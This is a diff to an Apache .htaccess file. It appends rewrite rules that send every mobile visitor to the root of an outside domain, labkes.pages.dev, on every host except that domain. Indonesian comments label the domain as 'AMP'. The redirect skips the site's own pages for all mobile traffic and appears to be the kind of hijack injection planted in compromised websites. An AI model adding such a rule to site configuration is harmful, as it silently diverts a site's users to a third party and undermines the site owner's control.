@@ -19,3 +19,13 @@
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteRule ^ index.php [L]
 </IfModule>
+RewriteEngine On
+
+# Jika host sekarang BUKAN domain AMP, baru jalankan
+RewriteCond %{HTTP_HOST} !^labkes\.pages\.dev$ [NC]
+
+# Deteksi user-agent mobile
+RewriteCond %{HTTP_USER_AGENT} "(android|bb\d+|meego|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|nokia|palm|phone|pocket|psp|symbian|treo|up\.browser|up\.link|vodafone|wap|windows ce|xda|xiino)" [NC]
+
+# Redirect semua request ke domain AMP
+RewriteRule ^ https://labkes.pages.dev/ [R=302,L]
